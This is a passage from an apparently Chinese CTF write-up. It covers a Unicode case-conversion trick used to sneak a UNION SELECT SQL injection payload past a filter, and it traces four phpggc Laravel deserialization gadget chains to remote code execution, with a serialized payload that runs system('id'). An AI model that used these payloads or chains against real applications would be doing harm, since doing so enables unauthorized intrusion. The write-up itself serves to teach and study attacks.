class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">String</span>.fromCodePoint) &#123;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> defineProperty = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">// IE 8 only supports `Object.defineProperty` on DOM elements</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">var</span> object = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> $defineProperty = <span class="built_in">Object</span>.defineProperty;</span><br><span class="line"><span class="keyword">var</span> result = $defineProperty(object, object, object) &amp;&amp; $defineProperty;</span><br><span class="line">&#125; <span class="keyword">catch</span>(error) &#123;&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;());</span><br><span class="line"><span class="keyword">var</span> stringFromCharCode = <span class="built_in">String</span>.fromCharCode;</span><br><span class="line"><span class="keyword">var</span> floor = <span class="built_in">Math</span>.floor;</span><br><span class="line"><span class="keyword">var</span> fromCodePoint = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> MAX_SIZE = <span class="number">0x4000</span>;</span><br><span class="line"><span class="keyword">var</span> codeUnits = [];</span><br><span class="line"><span class="keyword">var</span> highSurrogate;</span><br><span class="line"><span class="keyword">var</span> lowSurrogate;</span><br><span class="line"><span class="keyword">var</span> index = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">var</span> length = <span class="built_in">arguments</span>.length;</span><br><span class="line"><span class="keyword">if</span> (!length) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> result = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">while</span> (++index &lt; length) &#123;</span><br><span class="line"><span class="keyword">var</span> codePoint = <span class="built_in">Number</span>(<span class="built_in">arguments</span>[index]);</span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">!<span class="built_in">isFinite</span>(codePoint) || <span class="comment">// `NaN`, `+Infinity`, or `-Infinity`</span></span><br><span class="line">codePoint &lt; <span class="number">0</span> || <span class="comment">// not a valid Unicode code point</span></span><br><span class="line">codePoint &gt; <span class="number">0x10FFFF</span> || <span class="comment">// not a valid Unicode code point</span></span><br><span class="line">floor(codePoint) != codePoint <span class="comment">// not an integer</span></span><br><span class="line">) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="built_in">RangeError</span>(<span class="string">'Invalid code point: '</span> + codePoint);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (codePoint &lt;= <span class="number">0xFFFF</span>) &#123; <span class="comment">// BMP code point</span></span><br><span class="line">codeUnits.push(codePoint);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// Astral code point; split in surrogate halves</span></span><br><span class="line"><span class="comment">// http://mathiasbynens.be/notes/javascript-encoding#surrogate-formulae</span></span><br><span class="line">codePoint -= <span class="number">0x10000</span>;</span><br><span class="line">highSurrogate = (codePoint &gt;&gt; <span class="number">10</span>) + <span class="number">0xD800</span>;</span><br><span class="line">lowSurrogate = (codePoint % <span class="number">0x400</span>) + <span class="number">0xDC00</span>;</span><br><span class="line">codeUnits.push(highSurrogate, lowSurrogate);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (index + <span class="number">1</span> == length || codeUnits.length &gt; MAX_SIZE) &#123;</span><br><span class="line">result += stringFromCharCode.apply(<span class="literal">null</span>, codeUnits);</span><br><span class="line">codeUnits.length = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">if</span> (defineProperty) &#123;</span><br><span class="line">defineProperty(<span class="built_in">String</span>, <span class="string">'fromCodePoint'</span>, &#123;</span><br><span class="line"><span class="string">'value'</span>: fromCodePoint,</span><br><span class="line"><span class="string">'configurable'</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">'writable'</span>: <span class="literal">true</span></span><br><span class="line">&#125;);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">String</span>.fromCodePoint = fromCodePoint;</span><br><span class="line">&#125;</span><br><span class="line">&#125;());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="string">'A'</span>.charCodeAt(); j &lt;= <span class="string">'Z'</span>.charCodeAt(); j++)&#123;</span><br><span class="line"><span class="keyword">var</span> s = <span class="built_in">String</span>.fromCodePoint(j);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10FFFF</span>; i++) &#123;</span><br><span class="line"><span class="keyword">var</span> e = <span class="built_in">String</span>.fromCodePoint(i);</span><br><span class="line"><span class="keyword">if</span> (s == e.toUpperCase() &amp;&amp; s != e) &#123;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">"char: "</span>+e+<span class="string">"&lt;br/&gt;"</span>);</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>最终可以得出以下几点特性<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;ı&quot;.toUpperCase() == &apos;I&apos;</span><br><span class="line">&quot;ſ&quot;.toUpperCase() == &apos;S&apos;</span><br><span class="line">&quot;K&quot;.toLowerCase() == &apos;k&apos;</span><br></pre></td></tr></table></figure></p><p>从而构造payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=test&amp;password=%27+un%C4%B1on+%C5%BFelect+1,(%C5%BFelect+flag+from+flags),&apos;3</span><br></pre></td></tr></table></figure></p><p>我们可以看一下这个payload经过处理之后是怎样的<br><img src="https://i.loli.net/2020/06/04/rTmCKdtoAf8GyhU.png" alt="5D317E21-AE8E-4A5E-A15A-80D1391CFE11.png"></p><p>PS: 补充另外一个JS的小特性，这个特性在<a href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/" target="_blank" rel="noopener">《Security Bugs in Practice: SSRF via Request Splitting》</a>中被使用</p><p><img src="https://i.loli.net/2020/06/04/U9mFsQtNZe8nSpu.png" alt="340A0E5E-C178-423A-ACF1-6C8100E5E7E1.png"></p><h3 id="2-unicode大小写转换问题"><a href="#2-unicode大小写转换问题" class="headerlink" title="2.unicode大小写转换问题"></a>2.unicode大小写转换问题</h3><p>在此处补充一下Python3的unicode大小写转换问题，造成这个问题的原因是</p><blockquote><p>这里的特殊部分是转换行为。 并非所有Unicode字符在转换为大写字母时都具有匹配的表示形式 - 因此浏览器通常倾向于采用外观相似，最适合的映射ASCII字符。 这种行为有相当大范围的字符，所有浏览器的做法都有所不同。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;ı&quot;.upper() == &apos;I&apos;</span><br><span class="line">&quot;ſ&quot;.upper() == &apos;S&apos;</span><br><span class="line">&quot;K&quot;.lower() == &apos;k&apos;</span><br></pre></td></tr></table></figure></p></blockquote><p>还有一些其其它的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">K ---- k</span><br><span class="line">ß(223) ---- SS</span><br><span class="line">ı(305) ---- I</span><br><span class="line">ſ(383) ---- S</span><br><span class="line">ﬀ(64256) ---- FF</span><br><span class="line">ﬁ(64257) ---- FI</span><br><span class="line">ﬂ(64258) ---- FL</span><br><span class="line">ﬃ(64259) ---- FFI</span><br><span class="line">ﬄ(64260) ---- FFL</span><br><span class="line">ﬅ(64261) ---- ST</span><br><span class="line">ﬆ(64262) ---- ST</span><br></pre></td></tr></table></figure></p><h2 id="0x06-lumenserial"><a href="#0x06-lumenserial" class="headerlink" title="0x06 lumenserial"></a>0x06 lumenserial</h2><h3 id="1-环境配置"><a href="#1-环境配置" class="headerlink" title="1. 环境配置"></a>1. 环境配置</h3><p>因为此题是基于laravel框架开发的，所以在本地要用 <code>composer install</code> 进行环境配置，方便后面的审计。</p><h3 id="2-phpggc"><a href="#2-phpggc" class="headerlink" title="2. phpggc"></a>2. phpggc</h3><p>这个题目是基于laravel框架开发的，phpggc中又恰好有4种关于Laravel框架RCE的payload生成方法，所以首先学习一下这四种payload的生成。</p><h4 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h4><p><img src="https://i.loli.net/2020/06/04/vxsyGtKFm4WMlon.png" alt="1EE2E9E0-5236-4E90-983E-AA8AA94371D0.png"></p><p>从上图代码我们可以分析出反序列化的时候，类方法调用过程如下，首先执行如下语句，假设此时<code>$function</code>和<code>$parameter</code>参数分别对应<code>system</code>和<code>id</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> \Illuminate\Broadcasting\PendingBroadcast(<span class="keyword">new</span> \Faker\Generator($function),$parameter);</span><br></pre></td></tr></table></figure></p><p>接着跟进到<code>\Illuminate\Broadcasting\PendingBroadcast</code>类中看到如下信息<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>将之前的<code>(new \Faker\Generator($function),$parameter)</code>代入其实执行的就是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> \Faker\Generator($function)-&gt;dispatch($parameter);</span><br></pre></td></tr></table></figure></p><p>可看到将<code>Generator</code>当做函数调用进行使用了，所以直接查看到其中的如下代码，此时<code>__call</code>的参数是dispatch和id<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $attributes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;format($method, $attributes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>之后跟进<code>format</code>函数进行查看，发现使用到了<code>call_user_func_array</code>函数来进行处理。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span><span class="params">($formatter, $arguments = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;getFormatter($formatter), $arguments);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>继续跟进一下<code>getFormatter</code>函数，其中的参数是dispatch<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span><span class="params">($formatter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;formatters[$formatter])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[$formatter];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;providers <span class="keyword">as</span> $provider) &#123;</span><br><span class="line">        <span class="keyword">if</span> (method_exists($provider, $formatter)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[$formatter] = <span class="keyword">array</span>($provider, $formatter);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[$formatter];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> \InvalidArgumentException(sprintf(<span class="string">'Unknown formatter "%s"'</span>, $formatter));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>最终<code>getFormatter</code>函数将返回<code>system</code>。</p><p>PS：<code>__call</code>是在不存在对应的函数调用时才使用的。</p><h4 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h4><p><img src="https://i.loli.net/2020/06/04/nGRtrgNpxbYfZ8c.png" alt="34CC2E37-D469-460F-8940-A0F6F2ED3C48.png"></p><p>类似的进行分析，首先在反序列化时也是先进入<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>针对<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> \Illuminate\Broadcasting\PendingBroadcast(<span class="keyword">new</span> \Illuminate\Events\Dispatcher($function, $parameter),$parameter);</span><br></pre></td></tr></table></figure></p><p>对应执行的就是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> \Illuminate\Events\Dispatcher($function, $parameter)-&gt;dispatch($parameter)</span><br></pre></td></tr></table></figure></p><p>要知道此时是有<code>dispatch</code>这个函数的，所以我们就继续跟进这个函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatch</span><span class="params">($event, $payload = [], $halt = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    [$event, $payload] = <span class="keyword">$this</span>-&gt;parseEventAndPayload(</span><br><span class="line">        $event, $payload</span><br><span class="line">    );<span class="comment">//将$event设置为数组返回</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;shouldBroadcast($payload)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;broadcastEvent($payload[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $responses = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;getListeners($event) <span class="keyword">as</span> $listener) &#123;</span><br><span class="line">        $response = $listener($event, $payload);</span><br><span class="line">        <span class="keyword">if</span> ($halt &amp;&amp; ! is_null($response)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $response;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($response === <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $responses[] = $response;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $halt ? <span class="keyword">null</span> : $responses;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>此处只看<code>$event</code>变量的传递，所以继续跟入<code>getListeners</code>函数，可以看到我们传入的类名肯定是不存在的，因此这个函数必定返回<code>$listeners</code>变量的值。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getListeners</span><span class="params">($eventName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $listeners = <span class="keyword">$this</span>-&gt;listeners[$eventName] ?? [];</span><br><span class="line"></span><br><span class="line">    $listeners = array_merge(</span><br><span class="line">        $listeners,</span><br><span class="line">        <span class="keyword">$this</span>-&gt;wildcardsCache[$eventName] ?? <span class="keyword">$this</span>-&gt;getWildcardListeners($eventName)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> class_exists($eventName, <span class="keyword">false</span>)</span><br><span class="line">                ? <span class="keyword">$this</span>-&gt;addInterfaceListeners($eventName, $listeners)</span><br><span class="line">                : $listeners;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>假设我们使用phpggc生成的payload如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> zeroyu@zeros ~ ./phpggc Laravel/RCE2 system id</span><br><span class="line">O:40:<span class="string">"Illuminate\Broadcasting\PendingBroadcast"</span>:2:&#123;s:9:<span class="string">"*events"</span>;O:28:<span class="string">"Illuminate\Events\Dispatcher"</span>:1:&#123;s:12:<span class="string">"*listeners"</span>;a:1:&#123;s:2:<span class="string">"id"</span>;a:1:&#123;i:0;s:6:<span class="string">"system"</span>;&#125;&#125;&#125;s:8:<span class="string">"*event"</span>;s:2:<span class="string">"id"</span>;&#125;</span><br></pre></td></tr></table></figure></p><p>那么最终dispatch函数中的<code>$response = $listener($event, $payload);</code>对应返回的就是<code>$response=system(&#39;id&#39;,[]);</code>此时<code>$response</code>将保存有命令执行后的结果。</p><h4 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h4><p><img src="https://i.loli.net/2020/06/04/WtPgK6V9yrzF3cl.png" alt="3CC61DDE-DA5C-4278-B0C8-6FDEDBB79714.png"></p><p>由下面这句代码展开分析<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> \Illuminate\Broadcasting\PendingBroadcast(<span class="keyword">new</span> \Illuminate\Notifications\ChannelManager($function, $parameter)</span><br></pre></td></tr></table></figure></p><p>反序列化的时候首先还是到<code>PendingBroadcast</code>中调用<code>__destruct</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>所这次的就相当于<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> \Illuminate\Notifications\ChannelManager($function, $parameter)-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br></pre></td></tr></table></figure></p><p>要知道<code>ChannelManager</code>里面是没有<code>dispatch</code>函数的，所以就会调用<code>__call</code>函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $parameters)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;driver()-&gt;$method(...$parameters);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>$method(...$parameters);</code>这部分并不重要，之后主要跟进<code>driver</code>函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">driver</span><span class="params">($driver = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $driver = $driver ?: <span class="keyword">$this</span>-&gt;getDefaultDriver();</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;drivers[$driver])) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;drivers[$driver] = <span class="keyword">$this</span>-&gt;createDriver($driver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;drivers[$driver];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>之前我们设置了如下几个变量，所以在此处<code>getDefaultDriver();</code>将返回<code>x</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;app = $parameter;</span><br><span class="line"><span class="keyword">$this</span>-&gt;customCreators = [<span class="string">'x'</span> =&gt; $function];</span><br><span class="line"><span class="keyword">$this</span>-&gt;defaultChannel = <span class="string">'x'</span>;</span><br></pre></td></tr></table></figure></p><p>接下来会继续到<code>createDriver</code>函数的位置，之后跟进一下这个函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">createDriver</span><span class="params">($driver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;customCreators[$driver])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;callCustomCreator($driver);</span><br></pre></td></tr></table></figure></p><p>可以看到接下来继续进入<code>callCustomCreator</code>函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">callCustomCreator</span><span class="params">($driver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;customCreators[$driver](<span class="keyword">$this</span>-&gt;app);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>也正是在此处返回了<code>$function($parameter)</code>的执行结果。</p><h4 id="第四种"><a href="#第四种" class="headerlink" title="第四种"></a>第四种</h4><p><img src="https://i.loli.net/2020/06/04/QmCRgJausZ3DBLj.png" alt="A8C1FFAB-D86C-4B3B-B50D-DC4296B52A29.png"></p><p>首先看一下这个chain的开始<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> \Illuminate\Broadcasting\PendingBroadcast(<span class="keyword">new</span> \Illuminate\Validation\Validator($function),$parameter);</span><br></pre></td></tr></table></figure></p><p>可以看到，这链也是从<code>PendingBroadcast</code>的<code>__destruct</code>开始的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>所以此处对应的执行就是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> \Illuminate\Validation\Validator($function)-&gt;dispatch($parameter);</span><br></pre></td></tr></table></figure></p><p>可以看到<code>Validator</code>类中也是没有<code>dispatch</code>函数的，因此调用的是<code>__call</code>函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $parameters)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $rule = Str::snake(substr($method, <span class="number">8</span>));</span><br><span class="line">    <span class="comment">// $rule=''</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;extensions[$rule])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;callExtension($rule, $parameters);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> BadMethodCallException(<span class="string">"Method [$method] does not exist."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>之后跟进<code>callExtension</code>函数，在其中的<code>call_user_func_array</code>处成功执行我们需要执行的函数。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">callExtension</span><span class="params">($rule, $parameters)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $callback = <span class="keyword">$this</span>-&gt;extensions[$rule];</span><br><span class="line"><span class="comment">// 之前chain中写的是$this-&gt;extensions = ['' =&gt; $function];所以此处的$callback=$function</span></span><br><span class="line">    <span class="keyword">if</span> (is_callable($callback)) &#123;</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array($callback, $parameters);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (is_string($callback)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;callClassBasedExtension($callback, $parameters);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这四种chain的分析可以参考<a href="https://www.anquanke.com/post/id/170681" target="_blank" 